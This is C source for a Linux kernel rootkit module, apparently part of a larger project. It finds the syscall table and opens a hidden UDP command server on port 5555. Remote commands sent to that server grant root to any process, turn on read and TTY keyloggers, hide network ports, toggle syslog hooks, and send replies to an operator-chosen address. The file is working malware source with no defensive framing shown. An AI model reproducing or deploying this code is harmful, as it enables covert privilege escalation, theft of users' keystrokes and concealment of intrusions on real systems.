#include "hide_files.h"
#include "hide_module.h"
#include "hide_packet.h"
#include "hide_process.h"
#include "hide_socket.h"
#include "hook_read.h"
#include "port_knocking.h"
#include "udp_server.h"
#include "root.h"
#include "syslog.h"

#define SERVER_PORT 5555
static struct socket *recvsocket=NULL;
static struct socket *clientsocket=NULL;
#define RESP(...) DEBUGMSG(__VA_ARGS__); respond(__VA_ARGS__);

bool hide_files = false;
bool hide_modules = false;
bool hide_packet = false;
bool hide_process = false;
bool hide_socket = false;
bool read = false;
bool readtty = false;
bool portknocking = false;
bool sysloging = false;

unsigned int curIP = 0;
unsigned short curPort = 0;

unsigned long* sys_call_table;

void findSysCallTable64(void)
{
	int i, low, high;
	unsigned char *ptr;
	unsigned long system_call;

	asm volatile("rdmsr" : "=a" (low), "=d" (high) : "c" (MSR_LSTAR));

	system_call = (void*)(((long)high << 32) | low);

	for (ptr = system_call, i = 0; i < 200; i++)  {
		if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5) {
			sys_call_table = (unsigned long*)(0xFFFFFFFF00000000 | *((unsigned int*)(ptr+3)));
			DEBUGMSG("syscall table from rdmsr: %lx and from sysmap: %lx at: %d\n", sys_call_table, MAP_sys_call_table, i);
			return;
		}

		ptr++;
	}
	DEBUGMSG("Syscall Table not found!\n");
	return;

}
/*Server stuf*/

void respond(char* string)
{
	//DEBUGMSG("IP: %d:%d\n", curIP, curPort);
	if(!(curIP && curPort)){
		//DEBUGMSG("No IP/Port set, You can set it by \"respond <ip> <port>\"\n");
		return;
	}
	struct msghdr msg;
	struct iovec iov;
	struct iov_iter ioviter;
	mm_segment_t oldfs;
	struct sockaddr_in to;
	int len;
	//DEBUGMSG("Try to send message to p: %d\n",curPort);
	memset(&to,0, sizeof(to));
	to.sin_family = AF_INET;
	to.sin_addr.s_addr = curIP;  
	to.sin_port = htons(curPort);
	memset(&msg,0,sizeof(msg));
	msg.msg_name = &to;
	msg.msg_namelen = sizeof(to);
	/* send the message back */
	iov.iov_base = string;
	iov.iov_len  = strlen(string);
	ioviter.iov = &iov;	
	ioviter.count = iov.iov_len;
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	msg.msg_iter = ioviter;
	//msg.msg_iovlen = 1;
	/* adjust memory boundaries */	
	oldfs = get_fs();
	set_fs(KERNEL_DS);
	len = sock_sendmsg(clientsocket, &msg);//, strlen(string));
	set_fs(oldfs);
	DEBUGMSG("done sending %d\n",len);
}


unsigned int parsecurIP(char* strIP){
	int err = 0;
	u8 IP[4];
	DEBUGMSG("hiding ip: %s\n", strIP);
	err = in4_pton(strIP, -1, IP, -1, NULL);
	if(err == 0) {
		DEBUGMSG("problem Parsing IPV4 addrss, trying IPv6\n");
	//	err = in6_pton(strIP, -1, hideThisIP6.s6_addr , -1, NULL);
		if(err == 0) {
			DEBUGMSG("Could not parse IP address!!!!!!!!!!\n");
			return 0;
		}
		DEBUGMSG("found IPv6 address\n");
	//	IPV6 = true;
	}
	DEBUGMSG("parsed PI!\n");
	return *((unsigned int*) IP);
}


void parseCommand(char* msg)
{
	int newPort,i;
	char* tmp;
	char* command[5];
	char* end;
	int len = 5;
	end = strreplace(msg, ' ','\0');
	//RESP("after replace");
	for(i = 0; i<5; i++) {
		command[i] = msg;
		msg = msg+strlen(msg)+1;
		if(msg >= end){
			len = i;
			break;
		}
	}
	
	DEBUGMSG("Msg: %d, ",len);
	for(i=0; i<=len; i++){
		DEBUGMSG("%s,", command[i]);
	}
	DEBUGMSG("\n");
	if(len < 1 ) 
		return;
	if(strstr(command[0], "respond")){
		curIP = parsecurIP(command[1]);
		if(curIP == 0){
			DEBUGMSG("Sorry could not parse ip\n");
			return;
		}
		sscanf(command[2], "%d", &curPort);
		DEBUGMSG("IP: %d, port %d\n", curIP, curPort);
		respond("ping\n");
		return;
	}
	if(strstr(command[0], "root") == command[0]) {
		int pid;
		RESP("try to root\n");
		sscanf(command[1], "%d", &pid);
		root_pid(pid);
		RESP("PID should be Root now\n");
		return;
	}
	if(strstr(command[0], "unroot")) {
		int pid;
		sscanf(command[1], "%d", &pid);
		unroot_pid(pid);
		RESP("PID should be undone now\n");	
		return;
	
	}
	if(strstr(command[0], "syslog")){
		if(strstr(command[1], "enable")){
			if(!sysloging){
				init_syslog();
				RESP("Enable syslog\n");
				sysloging = true;
			}
		}else if(strstr(command[1], "disable")){
			if(sysloging){
				exit_syslog();
				RESP("Disable syslog\n");
				sysloging = false;
			}
		}
		return;
	}
	if(strstr(command[0], "keylogger")){
		if(strstr(command[1], "enable")){
			if(len >= 2 ){
				if(strstr(command[2], "tty")) {
					if(readtty) {
						RESP("Keylogger already loaded\n");
						return;
					}
					RESP("OK I will enable the TTY Keylogger!\n");
					init_hook_tty();
					readtty = true;
				} 
			}else {
				if(read) {
					RESP("Keylogger already loaded\n");
					return;
				}
				RESP("OK i will enable the Keylogger!\n");
				init_hook_read();
				read = true;
			}
		}else if(strstr(command[1], "disable")){
			if(len >= 2) {
				if(strstr(command[2], "tty")) {
					if(!readtty){
						RESP("TTY Keylogger currently not loaded\n");
						return;
					}
					RESP("OK I will disable the TTY Keylogger!\n");
					exit_hook_tty();
					readtty = false;
				} 
			}else {
				if(!read){
					RESP("Keylogger currently not loaded\n");
					return;
				}
				RESP("OK i will disable the Keylogger!\n");
				exit_hook_read();
				read = false;
			}
		}else {
			RESP("Sorry, Command not recognized\n");
		}
	}

	if(strstr(command[0], "hidetcp")){
		sscanf(command[1], "%d", &newPort);
		DEBUGMSG("hide new tcp socket: %d\n", newPort);
		if(tcpNumPorts < 10){
			tcpPorts[tcpNumPorts] = newPort;
			tcpNumPorts++;
		} else {
			RESP("sorry Array is full, can't hide new socket\n");
		}
	}
	if(strstr(command[0], "hideudp")){
		sscanf(command[1], "%d", &newPort);
		DEBUGMSG("hide new udp socket: %d\n", newPort);
		if(udpNumPorts < 10){
			udpPorts[udpNumPorts] = newPort;
			udpNumPorts++;
		} else {
			RESP("sorry Array is full, can't hide new socket\n");
		}
	}
	if(strstr(command[0], "showtcp")){
		sscanf(command[1], "%d", &newPort);
		DEBUGMSG("hide new tcp socket: %d\n", newPort);

		for(i = 0; i < tcpNumPorts; i++){
			if(tcpPorts[i] == newPort)
				break;
		}
		for(; i < tcpNumPorts-1; i++){
			tcpPorts[i] = tcpPorts[i+1];
		}
		tcpPorts[tcpNumPorts - 1] = 0;
		tcpNumPorts--;

	}
/*
	DEBUGMSG("New tcp ports: %d\n", tcpNumPorts);

	for(i = 0; i<tcpNumPorts; i++) {
		DEBUGMSG("Socket to be hidden: %d - TCP\n",tcpPorts[i]);
	}
	DEBUGMSG("New udp ports: %d\n", udpNumPorts);
	for(i = 0; i<udpNumPorts; i++) {
		DEBUGMSG("Socket to be hidden: %d - UDP\n",udpPorts[i]);
	}
*/

}

void reactToUdpServer(struct work_struct *data)
{
	int len;
	struct  wq_wrapper * foo = container_of(data, struct  wq_wrapper, worker);
	// as long as there are messages in the receive queue of this socket
	while((len = skb_queue_len(&foo->sk->sk_receive_queue)) > 0){
		struct sk_buff *skb = NULL;

		// receive packet
		skb = skb_dequeue(&foo->sk->sk_receive_queue);
		struct iphdr* iph = ip_hdr(skb);
		//curIP = iph->saddr;
		//unsigned short* pp = (unsigned short*) skb->data;
		//curPort = *pp;//(unsigned short) *skb->data; // source port is first thing in udp header
		//DEBUGMSG("P:%d,%d,%d\n", curPort, ntohs(curPort), htons(curPort));
		//DEBUGMSG("Port: %d,%d,%d,%d,%d,%d,%d,%d\n", (unsigned short) ntohs(*skb->data),(unsigned short) ntohs(*skb->data),(unsigned short) ntohs(*skb->data+2),(unsigned short) ntohs(*skb->data+3),(unsigned short) ntohs(*skb->data+4),(unsigned short) ntohs(*skb->data+5),(unsigned short) ntohs(*skb->data+6),(unsigned short) ntohs(*skb->data+7),(unsigned short) ntohs(*skb->data+8));
		//DEBUGMSG("message len: %i message: %s\n", skb->len - 8, skb->data+8); //8 for udp header
		parseCommand(skb->data+8);	
		kfree_skb(skb);
	}
}

int setupSocket(void)
{
	struct sockaddr_in server;
	int servererror;
	DEBUGMSG("Init of module udpSocket \n");

	// Create a socket 
	if (sock_create(PF_INET, SOCK_DGRAM, IPPROTO_UDP, &recvsocket) < 0) {
		DEBUGMSG("server: Error creating recvsocket.\n" );
		return -EIO;
	}
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons( (unsigned short)SERVER_PORT);

	// Check correctness 
	servererror = recvsocket->ops->bind(recvsocket, (struct sockaddr *) &server, sizeof(server ));
	if (servererror) {
		sock_release(recvsocket);
		DEBUGMSG("server: error in Checking stuff.\n" );
		return -EIO;
	}
	recvsocket->sk->sk_data_ready = cb_data;

	// create work queue 
	INIT_WORK(&wq_data.worker, reactToUdpServer);
	wq = create_singlethread_workqueue("myworkqueue");
	if (!wq){ //If it is not possible to create the work queue
		DEBUGMSG("server: Error creating workque.\n" );
		return -ENOMEM; //Return Error No kernel Memory
	}

	// create response socket
	if (sock_create(PF_INET, SOCK_DGRAM, IPPROTO_UDP, &clientsocket) < 0) {
		DEBUGMSG("server: Error creating clientsocket.n" );
		return -EIO;
	}

	DEBUGMSG("server: done correct\n");
	return 0;
}

int __init init_mod(void)
{	
	DEBUGMSG("inserting...\n");
	
	findSysCallTable64();

	if(setupSocket()!=0){
		DEBUGMSG("Socket: Failed to set up\n");
		return -1;
	}
	DEBUGMSG("Socket set up, everything ready\n");
	return 0;
}

void __exit  exit_mod(void)
{
	DEBUGMSG("exiting...\n");


	DEBUGMSG("cleaning up server\n");

	if (wq) {
		flush_workqueue(wq);
		destroy_workqueue(wq);
	}
	if (recvsocket)
		sock_release(recvsocket);
	if (clientsocket)
		sock_release(clientsocket);


	if(read){
		exit_hook_read();
	}
	if(readtty){
		exit_hook_tty();
	}
	if(sysloging){
		exit_syslog();
	}
	DEBUGMSG("Done...\n");

	DEBUGMSG("ROOTKIT: Done...\n");
} 

module_init(init_mod);
module_exit(exit_mod);

MODULE_LICENSE("GPL"); 				/* Declare it as GPL License */
MODULE_AUTHOR(DRIVER_AUTHOR);		/* Declare the Author        */
MODULE_DESCRIPTION(DRIVER_DESC);	/* Short description         */
